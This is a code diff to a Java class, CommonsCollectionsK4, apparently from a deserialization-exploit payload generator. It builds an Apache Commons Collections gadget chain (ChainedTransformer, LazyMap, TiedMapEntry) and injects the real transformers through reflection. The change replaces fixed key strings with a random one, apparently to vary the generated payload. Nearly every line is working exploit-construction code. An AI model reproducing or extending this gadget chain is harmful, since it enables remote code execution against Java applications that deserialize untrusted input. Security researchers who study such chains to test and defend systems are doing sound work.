@@ -7,6 +7,7 @@ import com.ppp.secmgr.PayloadRunner;
 import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.Sink;
+import com.ppp.utils.RanDomUtils;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.functors.ChainedTransformer;
@@ -39,6 +40,8 @@ public class CommonsCollectionsK4 implements ObjectPayload<Object> {
     }
 
     public Object getChain(Object transformers) throws Exception {
+        String s = RanDomUtils.generateRandomString(1);
+
         final Transformer transformerChain = new ChainedTransformer(
                 new Transformer[]{new ConstantTransformer(1)});
 
@@ -46,8 +49,8 @@ public class CommonsCollectionsK4 implements ObjectPayload<Object> {
         LazyMap lazyMap = LazyMap.lazyMap(innerMap, transformerChain);
 
         Map<Object, Object> hashMap = new HashMap<Object, Object>();
-        TiedMapEntry tied = new TiedMapEntry(lazyMap, "x");
-        hashMap.put(tied, "t");
+        TiedMapEntry tied = new TiedMapEntry(lazyMap, s);
+        hashMap.put(tied, s);
         innerMap.clear();
 
         Reflections.setFieldValue(transformerChain, "iTransformers", transformers);
